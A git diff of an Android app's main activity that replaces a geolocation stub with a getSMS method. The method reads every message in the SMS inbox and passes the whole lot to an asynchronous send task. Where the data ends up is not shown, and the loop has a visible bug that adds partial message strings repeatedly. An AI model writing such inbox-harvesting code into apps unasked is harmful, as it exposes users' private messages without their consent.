@@ -7,6 +7,7 @@ import android.location.Geocoder;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.os.Environment;
 import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
@@ -22,6 +23,7 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
+import java.lang.reflect.Array;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
@@ -113,7 +115,26 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    public void getGeolocation(View view){
+    public void getSMS(View view){
 
+        ArrayList<String> messages = new ArrayList<>();
+
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                String msgData = "";
+                for(int idx=0;idx<cursor.getColumnCount();idx++)
+                {
+                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
+                    messages.add(msgData);
+                }
+                // use msgData
+            } while (cursor.moveToNext());
+        } else {
+            // empty box, no SMS
+        }
+
+        new SendSMSAsyncTask(this,messages).execute();
     }
 }
